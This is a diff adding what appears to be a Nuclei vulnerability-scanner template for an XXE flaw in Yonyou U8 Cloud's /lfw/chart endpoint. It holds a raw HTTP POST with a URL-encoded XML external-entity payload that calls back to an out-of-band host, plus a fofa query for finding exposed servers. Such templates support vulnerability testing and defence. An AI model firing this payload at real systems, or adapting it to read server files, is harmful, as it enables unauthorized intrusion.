@@ -1,0 +1,27 @@
+id: yonyou-u8c-lfw-chart-xxe
+
+info:
+  name: 用友-U8C-lfw-chart-xxe
+  author: Abbbbb
+  severity: high
+  metadata: 
+    fofa-query: app="用友-U8-Cloud"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        POST /lfw/chart HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+        type=pie&xmlstr=%3C?xml%20version=%271.0%27%20encoding=%27UTF-8%27?%3E%3C!DOCTYPE%20ANY%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://{{interactsh-url}}%22%3E]%3E%3Cchartdataset%3E%3Cparam%3E%3Ctitle%3E%26xxe;%3C/title%3E%3C/param%3E%3Cchart%3E%3Cname%3EUAP%3C/name%3E%3Ccount%3E1%3C/count%3E%3C/chart%3E%3C/chartdataset%3E
+            
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
